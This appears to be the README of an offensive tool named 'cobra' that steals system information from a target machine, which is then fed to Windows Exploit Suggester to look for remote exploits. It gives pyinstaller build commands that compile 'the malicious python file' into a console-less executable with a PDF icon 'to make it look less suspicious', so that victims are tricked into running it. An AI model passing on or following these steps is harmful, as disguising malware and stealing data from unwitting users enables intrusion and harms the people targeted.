`THE SYSTEM INFO STEALED BY COBRA CAN BE ADDED TO A TEXT FILE AND THEN RUN AGAINST SOMETHING LIKE WINDOWS EXPLOIT SUGGESTER..`

# WHY COBRA

In some situations sending malicious files or backdoors directly to the target can be risky..

cobra allows us to steal system info stealthly and then use that system info against windows exploit suggester  to look for remote exploits...

# STEPS TO RUN

`python3 wrf.py`

`pip3 install pyinstaller`

this will install pyinstaller on your system

`C:\Path to your python3 installed on your system\Scripts\pyinstaller cobra.py --onefile --noconsole --icon pdf-icon{path}`

This will compile the malicious python file to a executable and you may add icon of pdf to it using the --icon option to make it look less suspicious...

**After Stealing the info you can copy it and write it to a text file which you can furthur use with windows exploit suggester to look for remote exploits**
